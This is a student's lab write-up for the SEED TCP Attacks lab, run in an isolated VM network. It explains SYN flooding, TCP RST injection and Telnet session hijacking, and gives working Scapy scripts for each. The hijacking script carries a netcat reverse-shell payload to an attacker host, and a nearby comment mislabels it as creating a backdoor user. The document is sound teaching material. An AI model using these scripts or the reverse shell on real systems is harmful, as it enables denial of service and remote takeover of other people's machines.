# TCP Attack Lab

<div align="center">

![Lab](https://img.shields.io/badge/SEED%20Lab-TCP%20Attacks-red?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-Completed-brightgreen?style=for-the-badge)
![Tools](https://img.shields.io/badge/Tools-Scapy%20%7C%20Python%20%7C%20Wireshark-blue?style=for-the-badge)

</div>

**Student:** Zernouh Lakhdar  
**University:** Amar Telidji University, Laghouat, Algeria  
**Lab Series:** SEED Labs — Syracuse University  

---

## 🎯 Objective

This lab explores critical vulnerabilities in the **TCP/IP protocol stack** by implementing three major network attacks from scratch: **SYN Flooding**, **TCP RST attacks**, and **TCP Session Hijacking**. By crafting raw packets with Scapy, the lab reveals how TCP's trust model — based solely on IP addresses and sequence numbers — can be exploited by any on-path or off-path attacker with packet crafting capabilities.

---

## 🛠️ Environment Setup

| Component | Details |
|-----------|---------|
| **Attacker OS** | Kali Linux |
| **Victim Server** | Ubuntu 20.04 (`10.10.0.100`) |
| **Victim Client** | Ubuntu 20.04 (`10.10.0.1`) |
| **Network** | VirtualBox Internal Network (`10.10.0.0/24`) |
| **Tools** | Scapy 2.4+, Python 3, C compiler (gcc), Wireshark, netstat, telnet |
| **Kernel Setting** | SYN cookies toggled via `/proc/sys/net/ipv4/tcp_syncookies` |

---

## ✅ Tasks Completed

- ✅ **Task 1** — Study TCP three-way handshake and packet structure using Wireshark
- ✅ **Task 2.1** — Launch **SYN Flood attack** using Scapy with randomized source IPs
- ✅ **Task 2.2** — Observe half-open connection queue exhaustion (`netstat -tna`)
- ✅ **Task 2.3** — Enable **SYN Cookies** countermeasure and verify attack mitigation
- ✅ **Task 3.1** — Launch **TCP RST attack** to terminate an active Telnet session
- ✅ **Task 3.2** — Automate RST injection using Scapy with Wireshark-sniffed sequence numbers
- ✅ **Task 4.1** — Perform **TCP Session Hijacking** by injecting data into an established connection
- ✅ **Task 4.2** — Execute a reverse shell via hijacked session

---

## 🧠 Key Concepts Covered

- **TCP three-way handshake** — SYN → SYN-ACK → ACK and state machine
- **Half-open connections** — server resources consumed waiting for final ACK
- **SYN Flood** — exhausting the backlog queue via forged SYN packets
- **SYN Cookies** — stateless defense allowing server to validate connections without storing state
- **TCP RST flag** — immediate connection termination; no authentication required
- **Sequence number prediction** — obtaining valid seq/ack numbers via sniffing
- **Session hijacking** — injecting arbitrary data into an established TCP stream
- **Reverse shell** — remote code execution through a hijacked session

---

## 📊 Key Findings

| Attack | Target | Outcome | Countermeasure |
|--------|--------|---------|---------------|
| SYN Flood | Server port 23 (Telnet) | ✅ New connections blocked | SYN Cookies (`tcp_syncookies=1`) |
| TCP RST | Active Telnet session | ✅ Session terminated instantly | Encrypted sessions (SSH), TLS |
| Session Hijacking | Telnet session | ✅ Arbitrary command injected | SSH, TLS encryption |
| Reverse Shell | Telnet session (hijacked) | ✅ Shell obtained | SSH, encrypted sessions |

**Key Takeaway:** TCP has no built-in authentication. Any attacker who can observe sequence numbers (on-path/sniffing) or predict them can forge valid packets. The only real countermeasure is **encrypted transport** (SSH, TLS) which makes injected packets detectable.

---

## 💻 Code & Scripts

All scripts are in the [`code/`](./code/) folder.

### Task 2 — SYN Flood (Scapy)
```python
# syn_flood.py — Flood target with forged SYN packets
from scapy.all import *
import random

target_ip   = "10.10.0.100"
target_port = 23  # Telnet

def synflood():
    print(f"[*] SYN flooding {target_ip}:{target_port} ...")
    while True:
        src_ip  = ".".join(str(random.randint(1, 254)) for _ in range(4))
        src_port = random.randint(1024, 65535)
        seq_num  = random.randint(0, 2**32 - 1)

        pkt = IP(src=src_ip, dst=target_ip) / \
              TCP(sport=src_port, dport=target_port, flags="S", seq=seq_num)
        send(pkt, verbose=False)

synflood()
```

```bash
# Monitor half-open connections on victim
netstat -tna | grep SYN_RECV | wc -l

# Disable SYN cookies (to observe full attack)
sudo sysctl -w net.ipv4.tcp_syncookies=0

# Enable SYN cookies (mitigation)
sudo sysctl -w net.ipv4.tcp_syncookies=1
```

### Task 3 — TCP RST Attack (Scapy)
```python
# tcp_rst.py — Terminate a TCP session by injecting RST
from scapy.all import *

def rst_attack(pkt):
    if pkt.haslayer(TCP) and pkt[TCP].flags & 0x02 == 0:  # Not SYN
        ip  = pkt[IP]
        tcp = pkt[TCP]

        # Forge RST from server's perspective
        rst = IP(src=ip.dst, dst=ip.src) / \
              TCP(sport=tcp.dport, dport=tcp.sport,
                  flags="R", seq=tcp.ack)
        send(rst, verbose=False)
        print(f"[*] RST sent: {ip.dst}:{tcp.dport} → {ip.src}:{tcp.sport}")

# Sniff Telnet traffic and inject RST
sniff(filter="tcp port 23", prn=rst_attack, store=False)
```

### Task 4 — Session Hijacking (Scapy)
```python
# session_hijack.py — Inject command into active Telnet session
from scapy.all import *

# Values obtained from Wireshark capture of active session
src_ip   = "10.10.0.1"    # Client IP
dst_ip   = "10.10.0.100"  # Server IP
src_port = 54321           # Client port (from Wireshark)
dst_port = 23              # Telnet
seq_num  = 0xDEADBEEF      # Next expected seq (from Wireshark)
ack_num  = 0xCAFEBABE      # Current ack (from Wireshark)

# Inject a command — e.g., create a backdoor user
payload = "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.0.2 9999 >/tmp/f\n"

pkt = IP(src=src_ip, dst=dst_ip) / \
      TCP(sport=src_port, dport=dst_port,
          flags="A", seq=seq_num, ack=ack_num) / \
      Raw(load=payload)

send(pkt, verbose=False)
print("[*] Hijack packet sent.")
```

---

## 🖼️ Screenshots

Screenshots are in the [`screenshots/`](./screenshots/) folder:

| File | Description |
|------|-------------|
| `01-telnet-session.png` | Legitimate Telnet session established |
| `02-wireshark-handshake.png` | TCP 3-way handshake captured in Wireshark |
| `03-syn-flood-running.png` | SYN flood script sending packets |
| `04-syn-recv-queue.png` | `netstat` showing SYN_RECV queue exhausted |
| `05-new-conn-blocked.png` | New Telnet connection refused during flood |
| `06-syn-cookies-on.png` | SYN cookies enabled — attack mitigated |
| `07-rst-attack.png` | RST injection script — session dropped |
| `08-session-terminated.png` | Telnet session killed by RST |
| `09-wireshark-rst.png` | Wireshark showing forged RST packet |
| `10-hijack-seqnum.png` | Wireshark capturing seq/ack numbers |
| `11-hijack-payload.png` | Injected command in Wireshark stream |
| `12-reverse-shell.png` | Reverse shell obtained via hijacked session |

---

## 📄 References

- **Lab Manual:** [`lab-instructions.pdf`](./lab-instructions.pdf) — included in this folder
- **SEED Labs:** https://seedsecuritylabs.org/Labs_20.04/Networking/TCP_Attacks/
- **RFC 793** — Transmission Control Protocol
- **RFC 4987** — TCP SYN Flooding Attacks and Common Mitigations

---

> 🔬 *This lab is part of the [SEED Labs](https://seedsecuritylabs.org/) series by Syracuse University. All experiments conducted in isolated virtual environments for educational purposes only.*
